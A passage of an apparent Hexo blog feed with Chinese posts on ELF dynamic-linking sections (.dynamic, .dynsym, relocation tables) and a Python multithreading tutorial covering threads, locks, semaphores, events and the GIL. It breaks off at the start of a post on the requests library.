0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x1000</span><br><span class="line"> 0x0000000d (FINI)                       0x12e8</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x3ef4</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x3ef8</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x1ec</span><br><span class="line"> 0x00000005 (STRTAB)                     0x29c</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x20c</span><br><span class="line"> 0x0000000a (STRSZ)                      182 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x4000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   24 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x3e4</span><br><span class="line"> 0x00000011 (REL)                        0x3a4</span><br><span class="line"> 0x00000012 (RELSZ)                      64 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffb (FLAGS_1)                    Flags: PIE</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x364</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x352</span><br><span class="line"> 0x6ffffffa (RELCOUNT)                   4</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure><h4 id="②-dynsym"><a href="#②-dynsym" class="headerlink" title="② .dynsym"></a>② .dynsym</h4><blockquote><p>与.symtab不同的是，“.dynsym” 只保存了与动态链接相关的符号，对于那些模块内部的符号，比如模块私有变量则不保存，很多时候动态链接模块同时拥有“.dynsym“和”.symtab“两个表，<font color="navy"><strong>”.symtab“ 中往往保存了所有符号，包括”.dynsym“ 中的符号。</strong></font></p></blockquote><font size="2">和”.symtab“类似，动态符号表也需要一些辅助的表，比如用于保存符号名的字符串表。静态链接是叫做符号字符串表”.strtab“(String Tab)，在这里就**动态符号字符串表**”.dynstr“(Dynamic String Table)；由于在动态链接下，我们需要在程序运行时查找符号，为了加快符号的查找过程，往往还有辅助的**符号哈希表**（.hash）</font><h4 id="③-动态链接重定位表-rel"><a href="#③-动态链接重定位表-rel" class="headerlink" title="③ 动态链接重定位表.rel.*"></a>③ 动态链接重定位表.rel.*</h4><blockquote><ul><li>”.rel.dyn“实际上是对数据引用的修正，它所修正的位置位于”.got“以及数据段</li><li>”.rel.plt“是对函数引用的修正，它所修正的位置位域”.got.plt“</li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-知识储备&quot;&gt;&lt;a href=&quot;#0x00-知识储备&quot; class=&quot;headerlink&quot; title=&quot;0x00 知识储备&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;0x00 知识储备&lt;/font&gt;&lt;/h2&gt;&lt;h3 id=&quot;1-前言&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
      <category term="二进制" scheme="https://muzibing.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Python多线程介绍</title>
    <link href="https://muzibing.github.io/2020/09/04/2020.09.04%EF%BC%88149%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/04/2020.09.04（149）/</id>
    <published>2020-09-03T16:00:00.000Z</published>
    <updated>2020-09-06T03:15:25.839Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-什么是多线程font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-什么是多线程font"></a> <font color="navy">0x00 什么是多线程？</font></h3><blockquote><p><font size="2">在计算机编程中，一个基本的概念就是同时对多个任务加以控制。许多程序设计问题都要求程序能够停下手头的工作，改为处理其他一些问题，再返回主进程。可以通过多种途径达到这个目的。最开始的时候，那些掌握机器低级语言的程序员编写一些“中断服务例程”，主进程的暂停是通过硬件级的中断实现的。尽管这是一种有用的方法，但编出的程序很难移植，由此造成了另一类的代价高昂问题。中断对那些实时性很强的任务来说是很有必要的。但对于其他许多问题，只要求将问题划分进入独立运行的程序片断中，使整个程序能更迅速地响应用户的请求。<br><strong>最开始，线程只是用于分配单个处理器的处理时间的一种工具。但假如操作系统本身支持多个处理器，那么每个线程都可分配给一个不同的处理器，真正进入“并行运算”状态</strong>。从程序设计语言的角度看，多线程操作最有价值的特性之一就是程序员不必关心到底使用了多少个处理器。程序在逻辑意义上被分割为数个线程;假如机器本身安装了多个处理器，那么程序会运行得更快，毋需作出任何特殊的调校。根据前面的论述，大家可能感觉线程处理非常简单。但必须注意一个问题：共享资源!如果有多个线程同时运行，而且它们试图访问相同的资源，就会遇到一个问题。举个例子来说，两个线程不能将信息同时发送给一台打印机。为解决这个问题，对那些可共享的资源来说(比如打印机)，它们在使用期间必须进入锁定状态。所以一个线程可将资源锁定，在完成了它的任务后，再解开(释放)这个锁，使其他线程可以接着使用同样的资源。<br>多线程是为了同步完成多项任务，不是为了提高运行效率，而是为了提高资源使用效率来提高系统的效率。线程是在同一时间需要完成多项任务的时候实现的。<br>一个采用了多线程技术的应用程序可以更好地利用系统资源。其主要优势在于充分利用了CPU的空闲时间片，可以用尽可能少的时间来对用户的要求做出响应，使得进程的整体运行效率得到较大提高，同时增强了应用程序的灵活性。更为重要的是，由于同一进程的所有线程是共享同一内存，所以不需要特殊的数据传送机制，不需要建立共享存储区或共享文件，从而使得不同任务之间的协调操作与运行、数据的交互、资源的分配等问题更加易于解决。</font></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading <span class="keyword">from</span> threading <span class="keyword">import</span> Lock,Thread <span class="keyword">import</span> time,os</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x01-python多线程详解font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-python多线程详解font"></a> <font color="navy">0x01 python多线程详解</font></h3><h4 id="1什么是线程"><a class="markdownIt-Anchor" href="#1什么是线程"></a> 1.什么是线程？</h4><blockquote><p>线程也叫轻量级进程，是操作系统能够进行运算调度的最小单位，它被包涵在进程之中，是进程中的实际运作单位。线程自己不拥有系统资源，只拥有一点儿在运行中必不可少的资源，但它可与同属一个进程的其他线程共享进程所拥有的全部资源。一个线程可以创建和撤销另一个线程，同一个进程中的多个线程之间可以并发执行。</p></blockquote><h4 id="2为什么要使用多线程"><a class="markdownIt-Anchor" href="#2为什么要使用多线程"></a> 2.为什么要使用多线程？</h4><p>线程在程序中是独立的、并发的执行流。与分隔的进程相比，进程中线程之间的隔离程度要小，它们共享内存、文件句柄    和其他进程应有的状态。因为线程的划分尺度小于进程，使得多线程程序的并发性高。进程在执行过程之中拥有独立的内存单元，而多个线程共享内存，从而极大的提升了程序的运行效率。</p><p>线程比进程具有更高的性能，这是由于同一个进程中的线程都有共性，多个线程共享一个进程的虚拟空间。线程的共享环境包括进程代码段、进程的共有数据等，利用这些共享的数据，线程之间很容易实现通信。操作系统在创建进程时，必须为改进程分配独立的内存空间，并分配大量的相关资源，但创建线程则简单得多。因此，使用多线程 来实现并发比使用多进程的性能高得要多。</p><blockquote><p>总结起来，使用多线程编程具有如下几个优点：</p><ul><li>进程之间不能共享内存，但线程之间共享内存非常容易。</li><li>操作系统在创建进程时，需要为该进程重新分配系统资源，但创建线程的代价则小得多。因此使用多线程来实现多任务并发执行比使用多进程的效率高 。</li><li>python语言内置了多线程功能支持，而不是单纯地作为底层操作系统的调度方式，从而简化了python的多线程编程。</li></ul></blockquote><h4 id="3普通创建方式"><a class="markdownIt-Anchor" href="#3普通创建方式"></a> 3.普通创建方式</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(n)</span>:</span></span><br><span class="line">    print(<span class="string">'task'</span>,n)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'2s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'1s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'0s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t1 = threading.Thread(target=run,args=(<span class="string">'t1'</span>,))     <span class="comment"># target是要执行的函数名（不是函数），args是函数对应的参数，以元组的形式存在</span></span><br><span class="line">    t2 = threading.Thread(target=run,args=(<span class="string">'t2'</span>,))</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><h4 id="4自定义线程"><a class="markdownIt-Anchor" href="#4自定义线程"></a> 4.自定义线程</h4><blockquote><p>继承threading.Thread来定义线程类，其本质是重构Thread类中的run方法</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,n)</span>:</span></span><br><span class="line">        super(MyThread,self).__init__()   <span class="comment">#重构run函数必须写</span></span><br><span class="line">        self.n = n</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'task'</span>,self.n)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        print(<span class="string">'2s'</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        print(<span class="string">'1s'</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        print(<span class="string">'0s'</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t1 = MyThread(<span class="string">'t1'</span>)</span><br><span class="line">    t2 = MyThread(<span class="string">'t2'</span>)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><h4 id="5守护线程"><a class="markdownIt-Anchor" href="#5守护线程"></a> 5.守护线程</h4><p>下面这个例子，这里使用setDaemon(True)把所有的子线程都变成了主线程的守护线程，因此当主线程结束后&lt;子线程也会随之结束，所以当主线程结束后，整个程序就退出了。</p><blockquote><p>所谓’线程守护’，就是主线程不管该线程的执行情况，只要是其他子线程结束且主线程执行完毕，主线程都会关闭。也就是说:主线程不等待该守护线程的执行完再去关闭。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(n)</span>:</span></span><br><span class="line">    print(<span class="string">'task'</span>,n)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'3s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'2s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'1s'</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t=threading.Thread(target=run,args=(<span class="string">'t1'</span>,))</span><br><span class="line">    t.setDaemon(<span class="keyword">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line">    print(<span class="string">'end'</span>)</span><br></pre></td></tr></table></figure><blockquote><p>通过执行结果可以看出，设置守护线程之后，当主线程结束时，子线程也将立即结束，不再执行 ‘’’ ‘’’</p></blockquote><h4 id="6主线程等待子线程结束"><a class="markdownIt-Anchor" href="#6主线程等待子线程结束"></a> 6.主线程等待子线程结束</h4><p>为了让守护线程执行结束之后，主线程再结束，我们可以使用join方法，让主线程等待子线程执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(n)</span>:</span></span><br><span class="line">    print(<span class="string">'task'</span>,n)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'5s'</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'3s'</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'1s'</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t=threading.Thread(target=run,args=(<span class="string">'t1'</span>,))</span><br><span class="line">    t.setDaemon(<span class="keyword">True</span>)    <span class="comment">#把子线程设置为守护线程，必须在start()之前设置</span></span><br><span class="line">    t.start()</span><br><span class="line">    t.join()     <span class="comment">#设置主线程等待子线程结束</span></span><br><span class="line">    print(<span class="string">'end'</span>)</span><br></pre></td></tr></table></figure><h4 id="7多线程共享全局变量"><a class="markdownIt-Anchor" href="#7多线程共享全局变量"></a> 7.多线程共享全局变量</h4><p>线程时进程的执行单元，进程时系统分配资源的最小执行单位，所以在同一个进程中的多线程是共享资源的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">g_num = <span class="number">100</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span>  g_num</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        g_num+=<span class="number">1</span></span><br><span class="line">    print(<span class="string">'in work1 g_num is : %d'</span> % g_num)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> g_num</span><br><span class="line">    print(<span class="string">'in work2 g_num is : %d'</span> % g_num)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t1 = threading.Thread(target=work1)</span><br><span class="line">    t1.start()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    t2=threading.Thread(target=work2)</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><p>由于线程之间是进行随机调度，并且每个线程可能只执行n条执行之后，当多个线程同时修改同一条数据时可能会出现脏数据，    所以出现了线程锁，即同一时刻允许一个线程执行操作。线程锁用于锁定资源，可以定义多个锁，像下面的代码，当需要独占    某一个资源时，任何一个锁都可以锁定这个资源，就好比你用不同的锁都可以把这个相同的门锁住一样。  由于线程之间是进行随机调度的，如果有多个线程同时操作一个对象，如果没有很好地保护该对象，会造成程序结果的不可预期， 我们因此也称为“线程不安全”。 为了防止上面情况的发生，就出现了互斥锁（Lock）</p><h4 id="8互斥锁lock"><a class="markdownIt-Anchor" href="#8互斥锁lock"></a> 8.互斥锁（Lock）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    lock.acquire()</span><br><span class="line">    temp = n</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    n = temp<span class="number">-1</span></span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lock = Lock()</span><br><span class="line">    n = <span class="number">100</span></span><br><span class="line">    l = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        p = Thread(target=work)</span><br><span class="line">        l.append(p)</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> l:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure><h4 id="9递归锁"><a class="markdownIt-Anchor" href="#9递归锁"></a> 9.递归锁</h4><p>RLcok类的用法和Lock类一模一样，但它支持嵌套，在多个锁没有释放的时候一般会使用RLock类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(lock)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> gl_num</span><br><span class="line">    lock.acquire()</span><br><span class="line">    gl_num += <span class="number">1</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(gl_num)</span><br><span class="line">    lock.release()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    gl_num = <span class="number">0</span></span><br><span class="line">    lock = threading.RLock()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        t = threading.Thread(target=func,args=(lock,))</span><br><span class="line"><span class="comment">#         t.start()</span></span><br></pre></td></tr></table></figure><h4 id="10信号量boundedsemaphore类"><a class="markdownIt-Anchor" href="#10信号量boundedsemaphore类"></a> 10.信号量（BoundedSemaphore类）</h4><p>互斥锁同时只允许一个线程更改数据，而Semaphore是同时允许一定数量的线程更改数据，比如厕所有3个坑，那最多只允许3个人上厕所，后面的人只能等里面有人出来了才能再进去。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(n,semaphore)</span>:</span></span><br><span class="line">    semaphore.acquire()   <span class="comment">#加锁</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">'run the thread:%s\n'</span> % n)</span><br><span class="line">    semaphore.release()    <span class="comment">#释放</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">'__main__'</span>:</span><br><span class="line">    num=<span class="number">0</span></span><br><span class="line">    semaphore = threading.BoundedSemaphore(<span class="number">5</span>)   <span class="comment">#最多允许5个线程同时运行</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">22</span>):</span><br><span class="line">        t = threading.Thread(target=run,args=(<span class="string">'t-%s'</span> % i,semaphore))</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">while</span> threading.active_count() !=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'----------all threads done-----------'</span>)</span><br></pre></td></tr></table></figure><h4 id="11事件"><a class="markdownIt-Anchor" href="#11事件"></a> 11.事件</h4><p>python线程的事件用于主线程控制其他线程的执行，事件是一个简单的线程同步对象，其主要提供以下的几个方法：</p><ul><li>clear将flag设置为 False</li><li>set将flag设置为 True</li><li>is_set判断是否设置了flag</li><li>wait会一直监听flag，如果没有检测到flag就一直处于阻塞状态</li></ul><p>事件处理的机制：全局定义了一个Flag，当Flag的值为False，那么event.wait()就会阻塞，当flag值为True，那么event.wait()便不再阻塞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">event = threading.Event()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lighter</span><span class="params">()</span>:</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    event.set()         <span class="comment">#初始者为绿灯</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">5</span> &lt; count &lt;=<span class="number">10</span>:</span><br><span class="line">            event.clear()  <span class="comment">#红灯，清除标志位</span></span><br><span class="line">            print(<span class="string">"\33[41;lmred light is on...\033[0m]"</span>)</span><br><span class="line">        <span class="keyword">elif</span> count &gt; <span class="number">10</span>:</span><br><span class="line">            event.set()    <span class="comment">#绿灯，设置标志位</span></span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\33[42;lmgreen light is on...\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">car</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> event.is_set():     <span class="comment">#判断是否设置了标志位</span></span><br><span class="line">            print(<span class="string">'[%s] running.....'</span>%name)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[%s] sees red light,waiting...'</span>%name)</span><br><span class="line">            event.wait()</span><br><span class="line">            print(<span class="string">'[%s] green light is on,start going...'</span>%name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># startTime = time.time()</span></span><br><span class="line">light = threading.Thread(target=lighter,)</span><br><span class="line">light.start()</span><br><span class="line"></span><br><span class="line">car = threading.Thread(target=car,args=(<span class="string">'MINT'</span>,))</span><br><span class="line">car.start()</span><br><span class="line">endTime = time.time()</span><br><span class="line"><span class="comment"># print('用时：',endTime-startTime)</span></span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x02-gil-全局解释器-font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-gil-全局解释器-font"></a> <font color="navy">0x02 GIL  全局解释器 </font></h3><blockquote><p>在非python环境中，单核情况下，同时只能有一个任务执行。多核时可以支持多个线程同时执行。但是在python中，无论有多少个核        同时只能执行一个线程。究其原因，这就是由于GIL的存在导致的。GIL的全程是全局解释器，来源是python设计之初的考虑，为了数据安全所做的决定。某个线程想要执行，必须先拿到GIL，我们可以把GIL看做是“通行证”，并且在一个python进程之中，GIL只有一个。拿不到线程的通行证，并且在一个python进程中，GIL只有一个，拿不到通行证的线程，就不允许进入CPU执行。GIL只在cpython中才有，因为cpython调用的是c语言的原生线程，所以他不能直接操作cpu，而只能利用GIL保证同一时间只能有一个线程拿到数据。而在pypy和jpython中是没有GIL的python在使用多线程的时候，调用的是c语言的原生过程。</p></blockquote><p>python针对不同类型的代码执行效率也是不同的：</p><ol><li><p>CPU密集型代码（各种循环处理、计算等），在这种情况下，由于计算工作多，ticks技术很快就会达到阀值，然后出发GIL的释放与再竞争（多个线程来回切换当然是需要消耗资源的），所以python下的多线程对CPU密集型代码并不友好。</p></li><li><p>IO密集型代码（文件处理、网络爬虫等设计文件读写操作），多线程能够有效提升效率（单线程下有IO操作会进行IO等待，造成不必要的时间浪费，而开启多线程能在线程A等待时，自动切换到线程B，可以不浪费CPU的资源，从而能提升程序的执行 效率）。所以python的多线程对IO密集型代码比较友好。 ‘’’ ‘’’</p></li></ol><blockquote><p>主要要看任务的类型，我们把任务分为I/O密集型和计算密集型，而多线程在切换中又分为I/O切换和时间切换。如果任务属于是I/O密集型，    若不采用多线程，我们在进行I/O操作时，势必要等待前面一个I/O任务完成后面的I/O任务才能进行，在这个等待的过程中，CPU处于等待    状态，这时如果采用多线程的话，刚好可以切换到进行另一个I/O任务。这样就刚好可以充分利用CPU避免CPU处于闲置状态，提高效率。但是    如果多线程任务都是计算型，CPU会一直在进行工作，直到一定的时间后采取多线程时间切换的方式进行切换线程，此时CPU一直处于工作状态，    此种情况下并不能提高性能，相反在切换多线程任务时，可能还会造成时间和资源的浪费，导致效能下降。这就是造成上面两种多线程结果不能的解释。</p></blockquote><p><strong>结论</strong>：<font color="red">I/O密集型任务，建议采取多线程，还可以采用多进程+协程的方式(例如:爬虫多采用多线程处理爬取的数据)；对于计算密集型任务，python此时就不适用了。</font></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-什么是多线程font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-什么是多线程font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;0x00 什么是
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python库总结</title>
    <link href="https://muzibing.github.io/2020/09/04/2020.09.04%EF%BC%88148%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/04/2020.09.04（148）/</id>
    <published>2020-09-03T16:00:00.000Z</published>
    <updated>2020-09-06T13:11:58.844Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x01-requests-库font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-requests-库font"></a> <font color="navy">0x01 requests 库</font></h3><blockquote><p><a href="https://requests.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">相关链接</a></p></blockquote><h4 id="1发送请求"><a class="markdownIt-Anchor" href="#1发送请求"></a> 1.发送请求</h4><p><code>get 请求</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 头部信息</span></span><br><span class="line">header = &#123;</span><br><span class="line">            <span class="string">'Accept'</span>: <span 